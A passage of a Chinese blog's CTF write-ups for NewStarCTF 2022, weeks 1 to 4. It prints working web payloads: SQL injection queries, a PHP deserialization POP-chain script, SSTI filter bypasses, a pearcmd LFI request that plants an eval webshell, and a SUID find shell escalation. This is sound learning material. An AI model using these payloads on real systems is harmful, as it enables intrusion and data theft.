src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK1-WP/image-135.png\"></p>\n<p>爆破之后是一张图片，直接使用百度查图，得到名字为<code>Hikari</code></p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK1-WP/image-136.png\"></p>\n<p>最后可以拼凑成flag</p>\n<h4 id=\"Look-my-eyes\"><a href=\"#Look-my-eyes\" class=\"headerlink\" title=\"Look my eyes\"></a>Look my eyes</h4><p>使用<code>SilentEye</code>打开图片，进行decode即可得到base64编码的字符串，进行base64解码即可得到flag</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK1-WP/image-142-1024x491.png\"><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK1-WP/image-143-1024x632.png\"></p>\n<p>最后得到flag为<code>flag&#123;L0ok_m3_1n_my_ey3s&#125;</code></p>\n<h2 id=\"CRYPTO\"><a href=\"#CRYPTO\" class=\"headerlink\" title=\"CRYPTO\"></a>CRYPTO</h2><h4 id=\"caeser\"><a href=\"#caeser\" class=\"headerlink\" title=\"caeser\"></a>caeser</h4><p>凯撒密码，直接使用凯撒密码解密即可得到flag</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK1-WP/image-137-1024x273.png\"></p>\n<h4 id=\"吉奥万·巴蒂斯塔·贝拉索先生的密码\"><a href=\"#吉奥万·巴蒂斯塔·贝拉索先生的密码\" class=\"headerlink\" title=\"吉奥万·巴蒂斯塔·贝拉索先生的密码\"></a>吉奥万·巴蒂斯塔·贝拉索先生的密码</h4><p>这是维吉尼亚密码，提示key的长度为三位，所以我们一位一位的去参试，最后得到<code>kfc</code></p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK1-WP/image-138-1024x329.png\"></p>\n<p>这一周的解题都在这里了，比较废物。自己还是太菜了……好好加油吧！</p>\n","categories":["web安全学习"],"tags":["比赛","CTF","web"]},{"title":"NewStarCTF 公开赛赛道 WEEK2 WP","url":"/2022/10/07/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/","content":"<h2 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h2><h4 id=\"Word-For-You-2-Gen\"><a href=\"#Word-For-You-2-Gen\" class=\"headerlink\" title=\"Word-For-You(2 Gen)\"></a>Word-For-You(2 Gen)</h4><p>这道题目做的时候，以为是布尔盲注，然后写脚本一直跑，就是得不到flag，好家伙…………因为他这道题没必要使用布尔盲注，想哭……</p>\n<p>这道题直接使用报错注入就可以了。使用<code>1’ union select updatexml(&#39;a&#39;,concat(&#39;~&#39;,database()),&#39;b&#39;)#</code>可以得到库名</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-30.png\"></p>\n<p>直接burp发到重发器来注入，然后我们使用<code>1&#39; union select updatexml(&#39;a&#39;,concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),&#39;b&#39;)#</code>可以分别得到三个表名<code>wfy_admin</code>、<code>wfy_comments</code>、<code>wfy_information</code></p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-31.png\"></p>\n<p>然后使用<code>1&#39; union select updatexml(&#39;a&#39;,concat(&#39;~&#39;,(select column_name from information_schema.columns where table_schema=database() and table_name=&#39;wfy_comments&#39; limit 0,1)),&#39;b&#39;)#</code><br>可以得到字段<code>id</code>、<code>text</code>、<code>user</code>、<code>name</code>、<code>display</code></p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-32.png\"></p>\n<p>最后使用<code>1&#39; union select updatexml(&#39;a&#39;,concat(&#39;~&#39;,(select concat(text,user,name,display) from wfy_comments limit 11,1)),&#39;b&#39;)#</code>可以得到flag</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-33.png\"></p>\n<h4 id=\"IncludeOne\"><a href=\"#IncludeOne\" class=\"headerlink\" title=\"IncludeOne\"></a><strong>IncludeOne</strong></h4><p>这道题目提示了我们使用随机数是不是真的随机，所以可能是要使用php_mt_seed这个工具进行破解了。</p>\n<p>题目给出了源码，而且还给出了一个随机数的值。所以我们使用php_mt_seed查看其种子的值。</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-34.png\"><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-35.png\"></p>\n<p>这里的值是我一个个试出来的，没有想到好的方法得到PHP的版本。然后我们得到种子之后就可以利用种子来绕过第一个if了。</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-36.png\"></p>\n<p>第二个if两个正则表达式，这里我们可以使用到伪协议了，但是因为base被过滤了，所以我们可以使rot13来代替，但是要包含NewStar，所以这里要介绍一个伪协议的特性了，过滤器是可以随便写的，所以这个字符串可以放在过滤器中，构造payload：<code>?file=php://filter/read=string.rot13|NewStar/resource=flag.php</code><br>结合起来就可以得到flag了</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-37.png\"><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-38.png\"></p>\n<p>进行rot13解密即可得到flag。</p>\n<h4 id=\"UnserializeOne\"><a href=\"#UnserializeOne\" class=\"headerlink\" title=\"UnserializeOne\"></a>UnserializeOne</h4><p>搞了四天，终于把反序列化搞懂了一点点，之前的反序列化题目白做了，题目给出了源码</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-39.png\"></p>\n<p>利用点在Sec类中的__invoke魔术方法中，所以我们要触发这个方法就需要Start类中的__isset魔术方法，再触发这个方法我们就需要eeee类中的__clone魔术方法，触发这个方法需要Easy类中的__call方法，触发__call我们可以访问Easy类中不存在。所以我们的pop链为</p>\n<blockquote>\n<p>Easy:__call-&gt;eeee:__clone-&gt;Start:__isset-&gt;Sec:__invoke，但是反序列化会先执行__destruct魔术方法，所以我们最后的pop链为</p>\n<p>Start:__destruct-&gt;Sec:__toString-&gt;Easy:__call-&gt;eeee:__clone-&gt;Start:__isset-&gt;Sec:__invoke</p>\n</blockquote>\n<p>最后代码如下：</p>\n<pre><code>&lt;?php\n\nclass Start\n&#123;\n    public $name;\n    public $func;\n\n    public function __destruct()\n    &#123;\n        echo &quot;Welcome to NewStarCTF, &quot; . $this-&gt;name;\n    &#125;\n\n    public function __isset($var)\n    &#123;\n        ($this-&gt;func)();\n    &#125;\n&#125;\n\nclass Sec\n&#123;\n    public $obj;\n    public $var;\n\n    public function __toString()\n    &#123;\n        $this-&gt;obj-&gt;check($this-&gt;var);\n        return &quot;CTFers&quot;;\n    &#125;\n\n    public function __invoke()// 利用点\n    &#123;\n        echo file_get_contents(&#39;flag.txt&#39;);\n    &#125;\n&#125;\n\nclass Easy\n&#123;\n    public $cla;\n\n    public function __call($fun, $var)\n    &#123;\n        $this-&gt;cla = clone $var[0];\n    &#125;\n&#125;\n\nclass eeee\n&#123;\n    public $obj;\n\n    public function __clone()\n    &#123;\n        if (isset($this-&gt;obj-&gt;cmd)) &#123;\n            echo &quot;success&quot;;\n        &#125;\n    &#125;\n&#125;\n\n$a = new Easy();\n$b = new eeee();\n$c = new Start();\n$d = new Sec();\n$b-&gt;obj = $c;\n$c-&gt;func = $d;\n$c-&gt;name = $d;\n$d-&gt;obj = $a;\n$d-&gt;var = $b;\n$a-&gt;callxxx($b);\necho serialize($a);\n</code></pre>\n<p>得出序列化的结果为：<code>O:4:&quot;Easy&quot;:1:&#123;s:3:&quot;cla&quot;;O:4:&quot;eeee&quot;:1:&#123;s:3:&quot;obj&quot;;O:5:&quot;Start&quot;:2:&#123;s:4:&quot;name&quot;;O:3:&quot;Sec&quot;:2:&#123;s:3:&quot;obj&quot;;r:1;s:3:&quot;var&quot;;O:4:&quot;eeee&quot;:1:&#123;s:3:&quot;obj&quot;;r:3;&#125;&#125;s:4:&quot;func&quot;;r:4;&#125;&#125;&#125;</code></p>\n<p>最后可以得到flag</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-40.png\"></p>\n<h4 id=\"ezAPI\"><a href=\"#ezAPI\" class=\"headerlink\" title=\"ezAPI\"></a><strong>ezAPI</strong></h4><p>源码泄露，访问<a href=\"http://www.zip得到源码/\">www.zip得到源码</a></p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-41.png\"></p>\n<p>这里是后面提示了才知道是GraphQL，所以还去学习了一下GraphQL的基本语法，首先使用<code>id=1&amp;data=&#123;&quot;query&quot;:&quot;query&#123;\\n __schema &#123;\\n types &#123;\\n name \\n &#125;\\n&#125;\\n&#125;\\n&quot;, &quot;variables&quot;:null&#125;</code>得到flag所在的位置</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-42.png\"></p>\n<p>最后使用<code>id=1&amp;data=&#123;&quot;query&quot;:&quot;query&#123;ffffllllaaagggg_1n_h3r3_flag &#123;flag&#125;&#125;&quot;,&quot;variables&quot;:null&#125;</code>得到flag</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-43.png\"></p>\n<h2 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h2><h4 id=\"Yesec-no-drumsticks-2\"><a href=\"#Yesec-no-drumsticks-2\" class=\"headerlink\" title=\"Yesec no drumsticks 2\"></a><strong>Yesec no drumsticks 2</strong></h4><p>提示是使用vim打开</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-44.png\"></p>\n<p>这是零宽度字符隐写，使用工具提取隐写的内容：<br><em><a href=\"http://330k.github.io/misc_tools/unicode_steganography.html\">http://330k.github.io/misc_tools/unicode_steganography.html</a></em></p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-45.png\"></p>\n<p>得到隐写内容之后进行解码，一直以为是base64编码，后来才试出来是base58编码</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-46.png\"></p>\n<p>再将十六进制转换为字符串即可得到flag</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-47.png\"></p>\n<h4 id=\"Coldwinds’s-Desktop\"><a href=\"#Coldwinds’s-Desktop\" class=\"headerlink\" title=\"Coldwinds’s Desktop\"></a>Coldwinds’s Desktop</h4><p>使用magick将144张图片拼凑到一起</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-48.png\"></p>\n<p>得到flag.png</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-49.png\"></p>\n<p>再使用gaps工具还原原图</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-50.png\"></p>\n<p>最后可以得到flag为<code>flag&#123;Y0u_successfu11y_s01ved_the_puzz1e&#125;</code>这个flag我真的是服了，想暴打出题人。</p>\n<p>这一周的解题都在这里了，还是比较废物。好好加油吧！</p>\n","categories":["web安全学习"],"tags":["比赛","CTF","web"]},{"title":"NewStarCTF 公开赛赛道 WEEK3 WP","url":"/2022/10/14/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/","content":"<h2 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h2><h4 id=\"BabySSTI-One\"><a href=\"#BabySSTI-One\" class=\"headerlink\" title=\"BabySSTI_One\"></a><strong>BabySSTI_One</strong></h4><p>根据题目提示应该是SSTI模板注入，所以我们进行验证一下</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-91.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">使用?name=&#123;&#123;&#x27;&#x27;.class&#125;&#125;发现class被过滤了</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-92.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">所以我们使用?name=&#123;&#123;&#x27;&#x27;[&#x27;cla&#x27;+&#x27;ss&#x27;]&#125;&#125;进行绕过，然后使用</span><br><span class=\"line\"></span><br><span class=\"line\">?name=&#123;&#123;&#x27;&#x27;&#x27;__cla&#x27;+&#x27;ss__&#x27;&#125;&#125;可以得到object类</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-93.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">使用?name=&#123;&#123;&#x27;&#x27;&#x27;__cla&#x27;+&#x27;ss__&#x27;&#x27;__subcl&#x27;+&#x27;asses__&#x27;&#125;&#125;得到所有子</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-94.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">然后我们获取os._wrap_close类，使用</span><br><span class=\"line\"></span><br><span class=\"line\">?name=&#123;&#123;&#x27;&#x27;&#x27;__cla&#x27;+&#x27;ss__&#x27;&#x27;__subcl&#x27;+&#x27;asses__&#x27;[117]&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-95.png\"><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-96.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">使用?name=&#123;&#123;&#x27;&#x27;&#x27;__cla&#x27;+&#x27;ss__&#x27;&#x27;__subcl&#x27;+&#x27;asses__&#x27;117[&#x27;glob&#x27;+&#x27;als&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-97.png\"></p>\n<p>然后找到eval</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">使用的是?name=&#123;&#123;&#x27;&#x27;&#x27;__cla&#x27;+&#x27;ss__&#x27;&#x27;__subcl&#x27;+&#x27;asses__&#x27;117&#x27;__glob&#x27;+&#x27;als__&#x27;[&#x27;eval&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-98.png\"></p>\n<p>然后我们使用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;&#x27;&#x27;&#x27;__cla&#x27;+&#x27;ss__&#x27;&#x27;__subcl&#x27;+&#x27;asses__&#x27;117&#x27;__glob&#x27;+&#x27;als__&#x27;&#x27;eval&#x27;&#125;&#125;可以执行命令，在根目录下发现了flag</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-99.png\"></p>\n<p>发现cat和flag都在黑名单中</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-100.png\"></p>\n<p>这里使用base编码绕过，因为base也在黑名单中，使用\\进行转义</p>\n<p>使用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;&#x27;&#x27;&#x27;__cla&#x27;+&#x27;ss__&#x27;&#x27;__subcl&#x27;+&#x27;asses__&#x27;117&#x27;__glob&#x27;+&#x27;als__&#x27;&#x27;eval&#x27;&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-101.png\"></p>\n<p>之后看了一下其他师傅的wp，发现自己的思路可能存在一些问题，想的太复杂了……</p>\n<h4 id=\"multiSQL\"><a href=\"#multiSQL\" class=\"headerlink\" title=\"multiSQL\"></a><strong>multiSQL</strong></h4><p>输入火华，发现回显的是他的成绩</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-102.png\"></p>\n<p>然后测试发现select、insert、union、update、updatexml都被过滤了，然后我们发现可以进行堆叠注入，所以我们使用%E7%81%AB%E5%8D%8E’;show<br>tables;#得到表名</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-103.png\"></p>\n<p>然后使用%E7%81%AB%E5%8D%8E’;show columns from score;#得到字段名</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-104.png\"></p>\n<p>因为要帮火华师傅修改成绩啊，所以我们要使用update，但是被过滤了，所以我们这样来修改后台数据，使用-1’;set @sql &#x3D;<br>CONCAT(‘up’,’date score set listen&#x3D;200’);prepare stmt from @sql;EXECUTE<br>stmt;#，最后点击验证成绩得到flag</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-105.png\"></p>\n<h4 id=\"IncludeTwo\"><a href=\"#IncludeTwo\" class=\"headerlink\" title=\"IncludeTwo\"></a>IncludeTwo</h4><p>题目给出了源码</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-106.png\"></p>\n<p>但是filter伪协议被过滤了，提示是要getshell</p>\n<p><a href=\"https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html\">Docker PHP裸文件本地包含综述</a></p>\n<p>这里是通过pearcmd.php来实现getshell的，使用burp进行抓包，参数改为<code>index.php?+config- create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=eval($_REQUEST[8])?&gt;+/tmp/monkey.php</code></p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-107.png\"></p>\n<p>然后我们包含文件monkey.php，使用?file&#x3D;&#x2F;tmp&#x2F;monkey，发现包含成功</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-108.png\"></p>\n<p>然后通过命令执行来得到flag</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-109.png\"><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-110.png\"></p>\n<h4 id=\"Maybe-You-Have-To-think-More\"><a href=\"#Maybe-You-Have-To-think-More\" class=\"headerlink\" title=\"Maybe You Have To think More\"></a>Maybe You Have To think More</h4><p>根据提示可以猜想是thinkPHP的反序列化，然后随便访问一个文件得到了thinkPHP的具体版本</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-111.png\"></p>\n<p>先在主页面随便输入一个用户，发现会获取cookie值</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-112.png\"></p>\n<p>通过解码发现是base64编码的值，而且是序列化的值</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-113.png\"></p>\n<p>然后我们在网上找了一篇关于thinkPHP5.1序列化的文章，直接拿到poc<br><a href=\"https://www.freebuf.com/vuls/263977.html\">https://www.freebuf.com/vuls/263977.</a><a href=\"https://www.freebuf.com/vuls/263977.html\">html</a></p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-114.png\"><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-115.png\"><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-116.png\"></p>\n<p>flag在环境变量里面</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-117.png\"></p>\n<h2 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h2><h4 id=\"qsdz’s-girlfriend-3\"><a href=\"#qsdz’s-girlfriend-3\" class=\"headerlink\" title=\"qsdz’s girlfriend 3\"></a>qsdz’s girlfriend 3</h4><p>使用xshell连接，然后在用户目录发现了flag，查看发现了提示</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-118.png\"></p>\n<p>在blog文件夹里面发现不要让密码相同的提示</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-119.png\"></p>\n<p>在用户thai的用户目录发现hint，但是打不开，通过查看memo文件可以得到密码进而得到hint</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-120.png\"><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-121.png\"></p>\n<p>SUID，通过百度搜索发现这个可以提升权限，使用find . -exec &#x2F;bin&#x2F;sh -p ; -quit提升权限</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-122.png\"></p>\n<p>使用ls查看girlfriends目录下的文件</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-123.png\"><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-124.png\"></p>\n<p>然后使用cat查看另外一个文件得到flag</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-125.png\"></p>\n<h2 id=\"下面是复现的内容：\"><a href=\"#下面是复现的内容：\" class=\"headerlink\" title=\"下面是复现的内容：\"></a>下面是复现的内容：</h2><p>原文地址：<a href=\"https://mochu.blog.csdn.net/article/details/127152796?spm=1001.2014.3001.5502\">BUUCTF NewStarCTF 公开赛赛道Week3<br>Writeup</a></p>\n<h4 id=\"Whats-HTTP\"><a href=\"#Whats-HTTP\" class=\"headerlink\" title=\"Whats HTTP\"></a>Whats HTTP</h4><p>所有步骤都做了，但是没看文件里面的内容……</p>\n<p>先打开流量包，把HTTP对象都导出</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-126.png\"></p>\n<p>文件按照文件的大小进行排序</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-127.png\"></p>\n<p>打开sssssercet发现是一段base64编码的内容</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-128.png\"><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-129.png\"></p>\n<h4 id=\"WebShell！\"><a href=\"#WebShell！\" class=\"headerlink\" title=\"WebShell！\"></a><strong>WebShell！</strong></h4><p>这题说flag的形式是flag{webshell密码_黑客获取的用户名_机密文件的内容}</p>\n<p>Webshell的密码是最容易获取的（这个我也获取到了，哈哈哈哈）</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-130.png\"></p>\n<p>接下来似乎好像就得看经验了，师傅说蚁剑的流量要看最长的那串base64解码就可以，并且一般是该参数两位之后的才是正确的命令的base64编码</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-131.png\"></p>\n<p>这里是看那几个最长的里面，慢慢试出来的，最后得出的命令是whoami以及获取机密文件的命令。</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-132.png\"></p>\n<p>然后这里的响应包都是gzip的形式</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-133.png\"></p>\n<p>这里将其改为hex转储</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-134.png\"></p>\n<p>将gzip格式的数据取出来</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-135.png\"></p>\n<p>将获取的16进制数据放到winhex中，保存为whoami.txt.gz文件</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-136.png\"><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-137.png\"></p>\n<p>所以得到用户名是www-data，tcp.stream eq 38是获取机密文件的命令，同样的方法</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-138.png\"></p>\n<p>最后flag为flag{n3wst4r_www-data_Y0UAr3G00D}</p>\n<p>得出结论：太难了，我不配作misc……</p>\n<p>这一周的解题都在这里了，还是比较废物。好好加油吧！</p>\n","categories":["web安全学习"],"tags":["比赛","CTF","web"]},{"title":"NewStarCTF 公开赛赛道 WEEK4 WP","url":"/2022/10/21/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/","content":"<h2 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h2><h4 id=\"So-Baby-RCE\"><a href=\"#So-Baby-RCE\" class=\"headerlink\" title=\"So Baby RCE\"></a>So Baby RCE</h4><p>这道题还是差一点点拿三血，也算是一个小进步吧</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/image-139.png\"></p>\n<p>题目给出了源码，是命令执行的</p>\n<pre><code>&lt;? phperror_reporting(0);\nif (isset($_GET[&quot;cmd&quot;])) &#123;\n    if 